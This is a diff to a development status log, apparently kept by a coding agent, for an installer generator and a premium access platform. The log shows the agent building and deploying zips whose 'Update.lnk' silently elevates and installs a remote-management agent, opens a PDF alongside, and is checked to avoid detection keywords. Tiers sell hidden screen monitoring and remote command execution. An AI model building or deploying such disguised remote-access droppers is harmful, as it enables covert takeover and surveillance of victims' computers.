@@ -779,7 +779,7 @@ Cyber Lab completion (Task 156).** Do not start Cyber Lab until marketing is don
 
 | **0e** | **Desktop-only install-link gate (TASK_175 — SCOPED 2026-10-06, OWNER PRIORITY: BUILD FIRST)** — optional per-link toggle: mobile/tablet openers see a white "open on your PC" modal instead of the file; desktop passes straight through. **PREMIUM-ONLY per owner 2026-10-07** — gate is the existing `hasEntitlement(userId,"devices")` check (premium tier 5 covers it); free minters get the flag silently dropped server-side (same posture as an invalid zipName, never a 400) and never see the checkbox (renders only when `privateAllowed` true); resolver does NO tier check (flag presence on the row IS the authority). Doc: `TASK_175_DESKTOP_ONLY_LINK_GATE.md` (+§3 gating). Sized SMALL. **Build before grant fix per owner 2026-10-06.** |
 | **0d** | **Premium / Premium Plus tier split (TASK_174 — SCOPED 2026-10-06, NOT STARTED)** — owner: today's Premium BECOMES Plus for all current users; trimmed Premium is the only advertised tier; Plus never advertised (owner-awarded via support-ticket request + manual invoice through existing payment rails). Tier 10 = Plus, 5 = Premium, 1 = trial (10 keeps all `>= 5` gates true; dispatch 10>5>1 free). Premium keeps mesh viewer + all non-device premium; Plus-only = screen monitoring, PIN, hide/reveal, maintenance, run-command, queues, power, clones. Per-user full Restrict button (new accountRestricted bool, one migration). Backfill tier-5→10. Doc: `TASK_174_PREMIUM_PLUS_TIERS.md`. Sized LARGE (5 sub-builds a–e). **AFTER grant fix + W6 per owner order.** |
-| **0b** | **Nested launcher folder (TASK_173 — SCOPED 2026-10-06, ready to build)** — owner wants the launcher in a SECOND folder nested inside the first: zip becomes `{ Update.lnk @ root, <inner>/<nested>/Launcher.exe, <inner>/<nested>/agent.bin, PDF follows exe }`, and the PS-bridge `.lnk` targets `.\<inner>\<nested>\Launcher.exe`. Shape: new optional `nestedFolder` (bare-name `clean()`, default e.g. `bin`) in `launcher-build.ts` + routes `names:` passthrough; zip entries + `validateLauncherBuild` names + `New-AgentShortcut.ps1 -LauncherSubFolder` (now takes the JOINED `inner\nested` relative path — no .ps1 logic change, just a longer value); `launcher.c` payload needs NO change (sibling of exe, invariant kept) and `open_pdf` parent-fallback already covers drift — PDF follows the exe so the sibling invariant holds. Spaceworker forwards it (`lib/vantra-link.ts` `InstallerNames` + `sanitizeInstallerNames` + `install-link/route.ts` `parseNames`, same bare-name drop rule) + Vantra parity (`zip-generator.ts`, `sw-installer-names.ts`). No DB migration. Verify: mint zip, assert entry list, assert bridge args contain the nested path, VM install. Sized MEDIUM. |
+| **0b** | **Nested launcher folder (TASK_176 — SHIPPED LIVE 2026-10-06, single-rename doubling)** — live on the generator (commit `c7c3447`): fresh-mint entry + inflated-lnk-byte proof done; md5 local==live, service restarted 20:09:16 CEST. Supersedes the older two-field text below. **Remaining:** Windows double-click confirm (owner hardware/VM). | `TASK_176_NESTED_LAUNCHER_SINGLE_RENAME.md` (+ section 9 log 2026-10-06) | **DONE-live, pending owner double-click confirm.** |
 | **0c** | **Admin grant bug (ROOT-CAUSED 2026-10-06, ready to fix — SMALL)** — Give-a-customer-funds ($50, skiddy4real@gmail.com, "founders funding") → "Grant failed". Cause: the grant route passes `adminId: session.sub` = the literal string `"admin"` (shared-passcode session, `lib/admin-auth.ts` — no per-admin accounts), but `WalletLedgerEntry.adminId` is FK `User? @relation("WalletAdmin")` (schema:1002-1003) and no `User` row with `id='admin'` exists → **P2003 FK violation inside `move()`'s `$transaction`** → throw escapes the `catch` (only `isUniqueViolation` is handled) → Next.js 500 HTML → panel's `res.json().catch(() => ({}))` yields no `error` string → generic "Grant failed". Your repro ($50 on the customer's real User row) can NEVER succeed until this is fixed. Only caller: `app/api/admin/wallet/grant/route.ts` (no other route calls `grantBalance`/`adminAdjustBalance`/`setPostpaidLimit` — all three share the broken shape). Fix (pick one): **(A) nullable-admin (recommended)** — `adminId: session.sub === "admin" ? null : session.sub` in route (or write `null` directly), keep note, add try/catch → JSON 500 instead of HTML, add test "grant with null adminId succeeds", panel keeps note + `error ?? Grant failed`; audit stays via note, no migration (column already nullable). **(B) sentinel admin User row** — migration seeds `User id='admin'` (hack, FK now hard-required, every grant depends on a magic row). Verify: grant $X on prod → balance +X, ledger `admin_grant` with note, success toast; note/amount rejections unchanged; unit test for null-adminId. Sized SMALL. |
 | **2b** | **Wallet W5 — `POST /api/wallet/spend` (the debit path)** — "Activate with balance": spend funded balance on premium terms, guarded by the same CAS `move()` + idempotency discipline as the credit path | **`PLAN_TASK_158_WALLET_BALANCE.md` §6.6 + `PLAN_TASK_167_WALLET_TOPUP.md` §6** (both explicitly OUT-of-scope there) | **BUILT as `b3e2540`, pushed, deploy run `37470986552` success — awaits verifier live-confirm.** W6 (EXE-from-wallet) stays after the silent fix + grant bug per owner order 2026-10-06 — do not widen W5 to EXE products. |
 | **0** | **P0 SILENT-INSTALL REGRESSION — live generator missing FIX 4 `--silent`** — owner-tested zip shows the TacticalRMM GUI dialog (regression of vantra-installer `e148ff5`). Live `/opt/vantra-installer/generator/src/install-command.ts` ended argv at the features map (grep silent = comments only); local installer-dev HAS it; origin/main now carries all three fix commits. FIX 5 PDF IS live — untouched. **FIXED LIVE 2026-10-06:** ported local file byte-identical over ssh (md5 `00ef606a22342c9fba6405d8471d603c` both ends), backup `install-command.ts.bak.TASK172_20261006_163032`, `systemctl restart vantra-msi-generator` → active (PID 115516, 2026-10-06 16:31:17 CEST, clean journal). **VERIFIED 2026-10-06 (independent re-run):** md5 still matches, service still active (same PID/timestamp), journalctl `-p err` empty, functional proof `buildEnrollmentCommand({...})` → `"... --rdp --ping --power --silent"` + `ENDS_SILENT:true`, live `routes.ts:668/775/812` embeds that same `enrollmentCommand` — every minted zip now carries `--silent`. No spaceworker commit for the fix (VPS deployed-by-copy); docs commits `ccd8293` (fix) + this one. GUI-silence = SIMULATION until owner confirms on Windows hardware. | **`TASK_172_SILENT_INSTALL_REGRESSION.md` (this fix)** | **VERIFIED LIVE + DEPLOYED-stable — owner can test: mint a fresh zip, install on Windows, expect no TacticalRMM GUI dialog.** |
@@ -2234,6 +2234,51 @@ four; do not claim live rendering.
   advertised, per-user Restrict, backfill 5→10; doc
   `TASK_174_PREMIUM_PLUS_TIERS.md`, row 0d) + repaired a mangled 0b
   row from an earlier edit (text restored byte-identical).
+
+### 2026-10-06 — TASK_176 nested launcher BUILT + PUSHED + DEPLOYED LIVE (single rename)
+
+- **Built (generator only, 2 files, commit `c7c3447` on `installer-dev`,
+  pushed — `origin/installer-dev` == `c7c3447`):**
+  `generator/src/launcher-build.ts` derives `nested = innerFolder/innerFolder`
+  after `clean()` (default `launcher`) — zip entries use the nested path
+  (`Update.lnk` @ root + `<inner>/<inner>/{Launcher.exe,agent.bin,<pdf>}`),
+  `-LauncherSubFolder` passes the joined `inner\inner` value (no `.ps1`
+  logic change), `names:` hands the already-doubled path to validation.
+  `generator/src/launcher-validate.ts` asserts the doubled path (entries +
+  bridge shape). NO UI change, NO new param, NO Vantra/SpaceWorker change,
+  NO migration. Scope doc `TASK_176_NESTED_LAUNCHER_SINGLE_RENAME.md`
+  unchanged (still describes the build correctly). Supersedes the stale §7
+  row 0b text (which described a two-field `nestedFolder` variant the owner
+  rejected — same-name doubling won).
+- **Local gates (this session, re-run):** generator `tsc --noEmit` clean;
+  derivation proof 5/5 (`acme`→`acme/acme`, blank/undefined→
+  `launcher/launcher`, `../evil`+65-char→`launcher/launcher` fallback, never
+  400); vantra `install-link-zip` 34/34; spaceworker `test:vantra` 68/68,
+  hosting 338/338, wallet 47/47, support 50/50, idlechip 15/15, idle 8/8;
+  spaceworker `tsc` clean, `prisma validate` ok, `CI=true next build` exit 0.
+  (Installer repo has no eslint config — skipped, nothing to baseline.)
+- **Deployed live (tar-over-ssh, NOT a git repo on the VPS):** backups
+  `launcher-build.ts.bak.TASK176_20261006` +
+  `launcher-validate.ts.bak.TASK176_20261006`; shipped both files; md5
+  local == live (`12e69ecf…` / `3081228a…`); `systemctl restart
+  vantra-msi-generator` → active (2026-10-06 20:09:16 CEST); journal `-p err`
+  empty; `/healthz` 200 `ready:true`, payload sha `920f59ba…` unchanged.
+  Rollback = restore backups + restart. No rebuild needed (service runs
+  `tsx src/server.ts`).
+- **Verified live (fresh mint `innerFolder: acme`, job
+  `0695d267-ec60-4732-94cc-ede468e5c38a`):** zip entries EXACTLY
+  `{Update.lnk, acme/acme/Launcher.exe, acme/acme/agent.bin}`; inflated
+  `.lnk` command text contains `powershell` + `.\acme\acme\Launcher.exe`
+  + `-Verb RunAs`, trigram-clean (no `-Enc`/`IEX`/`EncodedCommand`).
+  Test site/deployment rows left behind in RMM (mint script pattern) —
+  harmless, same as prior live mints.
+- **NOT verified:** Windows double-click → UAC → nested path → check-in
+  (no Windows box in this session — needs owner hardware or VM; do NOT
+  claim verified on the byte proof alone). No GUI-dialog regression
+  expected (`--silent` untouched, TASK_172 live).
+- **Next:** grant fix (row 0c, SMALL, root-caused) → W6 → tier split (0d).
+  Awaiting owner's RMM/code-sign breakdown (NOT the grant — separate
+  feasibility prompt, see below).
 
 ### 2026-10-07 — TASK_175 gated PREMIUM-ONLY (owner directive)
 
